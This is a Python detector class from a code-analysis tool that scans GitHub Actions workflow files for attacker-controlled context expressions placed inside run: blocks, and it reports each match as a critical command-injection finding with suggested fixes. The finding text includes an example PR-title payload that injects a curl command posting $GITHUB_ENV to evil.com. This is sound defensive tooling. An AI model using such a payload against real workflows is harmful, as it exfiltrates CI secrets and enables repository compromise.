"""GitHub Actions Command Injection detector.

Fast replacement for semgrep GitHub Actions injection rules. Scans workflow
files for dangerous patterns where user-controlled input flows into `run:` blocks.

Patterns detected:
- ${{ github.event.* }} in run: blocks (user-controlled input)
- ${{ github.head_ref }} (PR branch name - attacker controlled)
- ${{ github.event.pull_request.title }} (PR title - attacker controlled)
- ${{ github.event.issue.title }} (issue title - attacker controlled)
- ${{ github.event.comment.body }} (comment body - attacker controlled)

These patterns can lead to arbitrary command execution in CI workflows,
potentially compromising repository secrets and infrastructure.

CWE-78: Improper Neutralization of Special Elements used in an OS Command
"""

import re
from pathlib import Path
from typing import Any, Dict, List, Optional, Set

from repotoire.detectors.base import CodeSmellDetector
from repotoire.graph import FalkorDBClient
from repotoire.graph.enricher import GraphEnricher
from repotoire.logging_config import get_logger
from repotoire.models import CollaborationMetadata, Finding, Severity

logger = get_logger(__name__)


# Dangerous GitHub Actions expression patterns
# These are user-controlled inputs that should never be interpolated into run: blocks
DANGEROUS_CONTEXTS = [
    # Pull request metadata (attacker-controlled for external PRs)
    r"github\.event\.pull_request\.title",
    r"github\.event\.pull_request\.body",
    r"github\.event\.pull_request\.head\.ref",
    r"github\.event\.pull_request\.head\.label",
    r"github\.event\.pull_request\.head\.repo\.default_branch",
    # Head ref (branch name - attacker controlled)
    r"github\.head_ref",
    # Issue metadata (attacker-controlled)
    r"github\.event\.issue\.title",
    r"github\.event\.issue\.body",
    # Comment bodies (attacker-controlled)
    r"github\.event\.comment\.body",
    r"github\.event\.review\.body",
    r"github\.event\.review_comment\.body",
    # Discussion metadata (attacker-controlled)
    r"github\.event\.discussion\.title",
    r"github\.event\.discussion\.body",
    # Commit messages (can be attacker-controlled in forks)
    r"github\.event\.commits\[\d*\]\.message",
    r"github\.event\.head_commit\.message",
    r"github\.event\.head_commit\.author\.name",
    r"github\.event\.head_commit\.author\.email",
    # Pages metadata
    r"github\.event\.pages\[\d*\]\.page_name",
    # Workflow inputs (can be attacker-controlled via workflow_dispatch)
    r"github\.event\.inputs\.[^}]+",
    # Generic catch-all for event properties that might be user-controlled
    r"github\.event\.sender\.login",
]

# Compile patterns for efficient matching
DANGEROUS_PATTERN = re.compile(
    r"\$\{\{\s*(" + "|".join(DANGEROUS_CONTEXTS) + r")\s*\}\}",
    re.IGNORECASE
)

# Pattern to detect we're inside a run: block
# Matches run: | or run: > followed by commands, or run: "command"
RUN_BLOCK_PATTERN = re.compile(
    r"^\s*(?:-\s+)?run:\s*[|>]?\s*",
    re.MULTILINE
)


class GHActionsInjectionDetector(CodeSmellDetector):
    """Detects command injection vulnerabilities in GitHub Actions workflows.

    Scans `.github/workflows/*.yml` files for dangerous patterns where
    user-controlled GitHub context expressions are interpolated into shell
    commands via `run:` blocks.

    This is a CRITICAL security vulnerability that can lead to:
    - Arbitrary code execution in CI
    - Exfiltration of repository secrets
    - Supply chain attacks
    - Repository compromise

    Reference: https://securitylab.github.com/research/github-actions-untrusted-input/
    """

    def __init__(
        self,
        graph_client: FalkorDBClient,
        detector_config: Optional[Dict[str, Any]] = None,
        enricher: Optional[GraphEnricher] = None,
    ):
        """Initialize GitHub Actions injection detector.

        Args:
            graph_client: FalkorDB database client (not used but kept for interface)
            detector_config: Optional configuration dict with:
                - repository_path: Path to repository root
                - max_findings: Maximum findings to report (default: 50)
            enricher: Optional GraphEnricher for cross-detector collaboration
        """
        super().__init__(graph_client, detector_config)
        self.enricher = enricher
        self.logger = get_logger(__name__)

        config = detector_config or {}
        self.repository_path = Path(config.get("repository_path", "."))
        self.max_findings = config.get("max_findings", 50)

    def detect(self) -> List[Finding]:
        """Detect GitHub Actions command injection vulnerabilities.

        Scans all workflow files in .github/workflows/ for dangerous patterns.

        Returns:
            List of findings for detected vulnerabilities
        """
        findings = []

        workflows_dir = self.repository_path / ".github" / "workflows"
        if not workflows_dir.exists():
            self.logger.debug("No .github/workflows directory found")
            return findings

        # Incremental mode: skip unchanged files if changed_files is set
        changed_files: Optional[Set[Path]] = self.config.get("changed_files")

        # Scan all YAML files in workflows directory
        for yml_path in workflows_dir.glob("*.yml"):
            # Skip unchanged files in incremental mode
            if changed_files is not None and yml_path not in changed_files:
                continue
            findings.extend(self._scan_workflow_file(yml_path))
            if len(findings) >= self.max_findings:
                break

        # Also check .yaml extension
        for yaml_path in workflows_dir.glob("*.yaml"):
            # Skip unchanged files in incremental mode
            if changed_files is not None and yaml_path not in changed_files:
                continue
            findings.extend(self._scan_workflow_file(yaml_path))
            if len(findings) >= self.max_findings:
                break

        findings = findings[: self.max_findings]
        self.logger.info(
            f"GHActionsInjectionDetector found {len(findings)} potential vulnerabilities"
        )
        return findings

    def _scan_workflow_file(self, file_path: Path) -> List[Finding]:
        """Scan a workflow file for dangerous patterns.

        Args:
            file_path: Path to the workflow YAML file

        Returns:
            List of findings
        """
        findings = []

        try:
            content = file_path.read_text(encoding="utf-8", errors="ignore")
        except (OSError, UnicodeDecodeError) as e:
            self.logger.debug(f"Failed to read {file_path}: {e}")
            return findings

        rel_path = str(file_path.relative_to(self.repository_path))
        lines = content.split("\n")

        # Track whether we're inside a run: block
        in_run_block = False
        run_block_indent = 0
        run_block_start_line = 0

        for line_no, line in enumerate(lines, start=1):
            stripped = line.lstrip()

            # Check if this line starts a run: block
            if RUN_BLOCK_PATTERN.match(line):
                in_run_block = True
                run_block_indent = len(line) - len(stripped)
                run_block_start_line = line_no

                # Check if the run: is on the same line (inline)
                dangerous = DANGEROUS_PATTERN.search(line)
                if dangerous:
                    findings.append(
                        self._create_finding(
                            file_path=rel_path,
                            line_no=line_no,
                            line_content=line.strip(),
                            matched_pattern=dangerous.group(1),
                        )
                    )
                continue

            # Check if we're still inside the run: block (based on indentation)
            if in_run_block:
                current_indent = len(line) - len(stripped)

                # Empty lines continue the block
                if not stripped:
                    continue

                # If we dedented back to or before the run: level, we're out
                if current_indent <= run_block_indent and stripped and not stripped.startswith("-"):
                    in_run_block = False
                    continue

                # We're inside the run block - check for dangerous patterns
                dangerous = DANGEROUS_PATTERN.search(line)
                if dangerous:
                    findings.append(
                        self._create_finding(
                            file_path=rel_path,
                            line_no=line_no,
                            line_content=line.strip(),
                            matched_pattern=dangerous.group(1),
                            run_block_start=run_block_start_line,
                        )
                    )

        return findings

    def _create_finding(
        self,
        file_path: str,
        line_no: int,
        line_content: str,
        matched_pattern: str,
        run_block_start: Optional[int] = None,
    ) -> Finding:
        """Create a finding for detected command injection vulnerability.

        Args:
            file_path: Path to the affected workflow file
            line_no: Line number of the vulnerability
            line_content: The vulnerable line content
            matched_pattern: The dangerous pattern that was matched
            run_block_start: Optional line number where run: block starts

        Returns:
            Finding object
        """
        # Categorize the type of injection
        pattern_lower = matched_pattern.lower()
        if "pull_request" in pattern_lower or "head_ref" in pattern_lower:
            source_type = "Pull Request"
        elif "issue" in pattern_lower:
            source_type = "Issue"
        elif "comment" in pattern_lower or "review" in pattern_lower:
            source_type = "Comment"
        elif "commit" in pattern_lower:
            source_type = "Commit"
        elif "inputs" in pattern_lower:
            source_type = "Workflow Input"
        else:
            source_type = "User Input"

        title = f"GitHub Actions Command Injection ({source_type})"

        description = f"""**Critical: Command Injection in GitHub Actions Workflow**

**File**: `{file_path}`
**Line**: {line_no}

**Vulnerable pattern detected**: `${{{{ {matched_pattern} }}}}`

**Code**:
```yaml
{line_content}
```

This workflow interpolates user-controlled input directly into a shell command.
An attacker can exploit this to execute arbitrary commands in your CI environment.

**Attack vector**:
- For PRs: Attacker opens a PR with a malicious title/branch name
- For issues: Attacker creates an issue with a malicious title/body
- For comments: Attacker posts a comment with shell injection payload

**Example attack payload** (in PR title):
```
"; curl -X POST -d @$GITHUB_ENV http://evil.com; #
```

This can lead to:
- **Secrets exfiltration**: GITHUB_TOKEN, AWS keys, API tokens
- **Supply chain attacks**: Malicious code pushed to main branch
- **Lateral movement**: Access to other repositories via GITHUB_TOKEN
- **Complete repository compromise**
"""

        recommendation = f"""**Recommended fixes**:

1. **Use an intermediate environment variable** (preferred):
   ```yaml
   - name: Safe handling
     env:
       TITLE: ${{{{ {matched_pattern} }}}}
     run: |
       echo "Title: $TITLE"
   ```

2. **Use GitHub Script action** (for complex logic):
   ```yaml
   - uses: actions/github-script@v7
     with:
       script: |
         const title = context.payload.pull_request.title;
         // Process safely in JavaScript
   ```

3. **Validate/sanitize input first**:
   ```yaml
   - name: Validate input
     id: validate
     run: |
       # Only allow alphanumeric and basic punctuation
       echo "safe_title=$(echo '${{{{ {matched_pattern} }}}}' | tr -cd 'a-zA-Z0-9 ._-')" >> $GITHUB_OUTPUT
   - name: Use safe value
     run: echo "${{{{ steps.validate.outputs.safe_title }}}}"
   ```

**References**:
- https://securitylab.github.com/research/github-actions-untrusted-input/
- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
"""

        finding_id = f"gh_actions_injection_{file_path}_{line_no}"

        finding = Finding(
            id=finding_id,
            detector="GHActionsInjectionDetector",
            severity=Severity.CRITICAL,
            title=title,
            description=description,
            affected_nodes=[],
            affected_files=[file_path],
            line_start=line_no,
            line_end=line_no,
            suggested_fix=recommendation,
            estimated_effort="Low (15-30 minutes)",
            graph_context={
                "vulnerability": "command_injection",
                "cwe": "CWE-78",
                "pattern": matched_pattern,
                "source_type": source_type,
                "snippet": line_content[:200],
            },
        )

        # Add collaboration metadata for cross-detector correlation
        finding.add_collaboration_metadata(
            CollaborationMetadata(
                detector="GHActionsInjectionDetector",
                confidence=0.95,  # Very high confidence for pattern matches
                evidence=["pattern_match", "github_actions", source_type.lower()],
                tags=[
                    "security",
                    "command_injection",
                    "github_actions",
                    "cwe-78",
                    "critical",
                    "ci_cd",
                ],
            )
        )

        return finding

    def severity(self, finding: Finding) -> Severity:
        """Calculate severity for a finding.

        GitHub Actions command injection is always CRITICAL severity.

        Args:
            finding: Finding to assess

        Returns:
            Severity level (always CRITICAL)
        """
        return Severity.CRITICAL
